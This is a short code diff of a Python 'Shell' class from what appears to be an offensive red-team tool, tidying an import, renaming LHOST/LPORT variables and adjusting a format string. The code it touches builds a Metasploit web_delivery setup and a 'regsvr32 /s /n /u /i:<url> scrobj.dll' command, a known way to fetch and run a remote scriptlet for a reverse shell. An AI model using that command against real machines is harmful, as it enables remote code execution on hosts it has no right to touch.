@@ -1,5 +1,5 @@
 # encoding: utf8
-from .config import *
+from config import *
 
 
 class Shell:
@@ -18,7 +18,7 @@ Platform   -> All
 
 msf5 exploit(multi/script/web_delivery)
 
-""".format(lhost, port_msf)
+""".format(LHOST, LPORT)
 
         self.vbs = """
 <?XML version="1.0"?>
@@ -32,4 +32,4 @@ msf5 exploit(multi/script/web_delivery)
 """
 
     def reverse(self, url):
-        return "regsvr32 /s /n /u /i:{0} scrobj.dll".format(url)
+        return "regsvr32 /s /n /u /i:{} scrobj.dll".format(url)
